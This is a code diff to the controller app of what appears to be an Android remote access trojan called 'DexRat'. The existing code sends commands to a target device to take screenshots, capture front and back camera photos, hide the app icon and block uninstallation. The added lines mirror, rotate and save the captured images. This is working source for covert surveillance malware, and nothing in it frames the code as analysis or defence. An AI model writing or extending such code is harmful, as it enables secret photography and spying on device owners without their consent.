@@ -43,6 +43,7 @@ public class MainActivity extends AppCompatActivity {
     private View tabControl, tabMedia, tabSystem;
     private View cardLiveFeed;
     private Bitmap currentBitmap;
+    private boolean isFrontCamera = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -54,6 +55,8 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private com.google.android.material.button.MaterialButton btnAntiUninstall, btnHideIcon;
+
+    private int currentRotation = 0;
 
     private void initUI() {
         deviceSpinner = findViewById(R.id.deviceSpinner);
@@ -101,6 +104,21 @@ public class MainActivity extends AppCompatActivity {
         findViewById(R.id.btnScreenshot).setOnClickListener(v -> sendCmd("screenshot"));
         findViewById(R.id.btnFrontCam).setOnClickListener(v -> sendCmd("front_camera"));
         findViewById(R.id.btnBackCam).setOnClickListener(v -> sendCmd("camera"));
+
+        findViewById(R.id.btnRotate).setOnClickListener(v -> {
+            currentRotation = (currentRotation + 90) % 360;
+            if (currentBitmap != null) {
+                updateImageView(currentBitmap);
+            }
+        });
+
+        findViewById(R.id.btnSaveImg).setOnClickListener(v -> saveImage());
+        findViewById(R.id.btnDeleteImg).setOnClickListener(v -> {
+            currentBitmap = null;
+            liveView.setImageBitmap(null);
+            placeholder.setVisibility(View.VISIBLE);
+            cardLiveFeed.setVisibility(View.GONE);
+        });
         
         // TAB CORE
         findViewById(R.id.btnCheckPerms).setOnClickListener(v -> sendCmd("check_perms"));
@@ -168,8 +186,12 @@ public class MainActivity extends AppCompatActivity {
             finalCmd = "hide_icon:" + (current ? "off" : "on");
         } else if (cmd.equals("front_camera")) {
             finalCmd = "camera_front";
+            isFrontCamera = true;
         } else if (cmd.equals("camera")) {
             finalCmd = "camera_back";
+            isFrontCamera = false;
+        } else if (cmd.equals("screenshot")) {
+            isFrontCamera = false;
         }
 
         Map<String, Object> m = new HashMap<>();
@@ -286,14 +308,49 @@ public class MainActivity extends AppCompatActivity {
             byte[] decodedString = Base64.decode(b64.trim(), Base64.DEFAULT);
             Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);
             if (decodedByte != null) {
-                runOnUiThread(() -> {
-                    currentBitmap = decodedByte;
-                    liveView.setImageBitmap(decodedByte);
-                    placeholder.setVisibility(View.GONE);
-                    cardLiveFeed.setVisibility(View.VISIBLE);
-                });
+                Bitmap processed = decodedByte;
+                if (isFrontCamera) {
+                    android.graphics.Matrix matrix = new android.graphics.Matrix();
+                    matrix.preScale(-1.0f, 1.0f);
+                    processed = Bitmap.createBitmap(decodedByte, 0, 0, decodedByte.getWidth(), decodedByte.getHeight(), matrix, true);
+                }
+                currentBitmap = processed;
+                updateImageView(processed);
             }
         } catch (Exception ignored) {}
+    }
+
+    private void updateImageView(Bitmap bmp) {
+        if (bmp == null) return;
+        android.graphics.Matrix matrix = new android.graphics.Matrix();
+        matrix.postRotate(currentRotation);
+        Bitmap rotated = Bitmap.createBitmap(bmp, 0, 0, bmp.getWidth(), bmp.getHeight(), matrix, true);
+        runOnUiThread(() -> {
+            liveView.setImageBitmap(rotated);
+            placeholder.setVisibility(View.GONE);
+            cardLiveFeed.setVisibility(View.VISIBLE);
+        });
+    }
+
+    private void saveImage() {
+        if (currentBitmap == null) return;
+        try {
+            String filename = "IMG_" + System.currentTimeMillis() + ".jpg";
+            android.content.ContentValues values = new android.content.ContentValues();
+            values.put(android.provider.MediaStore.Images.Media.DISPLAY_NAME, filename);
+            values.put(android.provider.MediaStore.Images.Media.MIME_TYPE, "image/jpeg");
+            values.put(android.provider.MediaStore.Images.Media.RELATIVE_PATH, android.os.Environment.DIRECTORY_PICTURES + "/DexRat");
+
+            android.net.Uri uri = getContentResolver().insert(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, values);
+            if (uri != null) {
+                java.io.OutputStream out = getContentResolver().openOutputStream(uri);
+                currentBitmap.compress(Bitmap.CompressFormat.JPEG, 100, out);
+                if (out != null) out.close();
+                Toast.makeText(this, "Image saved to Pictures/DexRat", Toast.LENGTH_SHORT).show();
+            }
+        } catch (Exception e) {
+            Toast.makeText(this, "Save failed: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+        }
     }
 
     private void addLog(String msg) {
